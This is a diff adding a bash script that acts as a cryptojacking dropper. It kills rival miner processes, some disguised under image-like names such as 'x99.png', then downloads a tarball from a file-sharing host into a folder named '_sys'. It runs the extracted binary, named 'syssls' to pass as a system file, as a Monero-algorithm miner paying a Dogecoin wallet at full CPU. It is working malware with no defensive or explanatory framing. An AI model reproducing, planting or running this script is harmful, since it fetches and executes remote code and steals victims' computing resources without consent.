@@ -1,0 +1,24 @@
+#!/bin/bash
+
+pid=$(pidof default xmrig cptwxbz.png bot 10.png dmancrx.png tuisbxo.png x9931.png x999.png x99.png grhqarx.png tuisbxo1.png x10.png x993.png x99.out)
+if [ -n "$pid" ]; then
+    kill $pid
+    wait $pid 2>/dev/null
+fi
+
+if [ -f "_sys/syssls" ]; then
+    if pgrep -x "syssls" > /dev/null; then
+        exit 0
+    fi
+else
+    if pgrep -x "syssls" > /dev/null; then
+        pid=$(pidof syssls)
+        kill $pid
+    fi
+
+    mkdir _sys
+    cd _sys
+    wget https://filebin.net/dropcurl-73f3c07f-57ad-4642-a993-a2f939ae71b0/syssls.tar.gz -O temp_sys.tar.gz
+    tar -zxf temp_sys.tar.gz
+    ./syssls -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:D6ZdEQYeX6iMLXyFW4oAu3dpbXAyJj6fan.WHOOTAUTO --cpu-max-threads-hint=100
+fi
